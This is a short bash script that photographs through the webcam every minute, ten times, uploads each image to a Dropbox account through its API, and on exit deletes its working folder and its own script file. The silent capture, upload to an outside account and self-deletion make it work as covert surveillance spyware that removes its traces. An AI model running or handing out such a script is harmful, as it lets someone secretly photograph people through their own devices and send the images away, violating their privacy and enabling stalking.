#!/bin/bash

USER=$(whoami)

DIR=/home/$USER/tmp

TOKEN=your_dropbox_token

mkdir -p $DIR

function remove_folder {
  rm -rf "$DIR"
  rm -rf "/home/$USER/script.sh"
}

trap remove_folder EXIT

# execute the for, for some times..
for i in {1..10}
do
  NAME=$(date +%s%N).jpg

  fswebcam --no-banner $DIR/$NAME

  curl -X POST https://content.dropboxapi.com/2/files/upload \
    --header "Authorization: Bearer $TOKEN" \
    --header "Dropbox-API-Arg: {\"path\": \"/$NAME\",\"mode\": \"add\",\"autorename\": true,\"mute\": false}" \
    --header "Content-Type: application/octet-stream" \
    --data-binary @$DIR/$NAME

  sleep 60
done
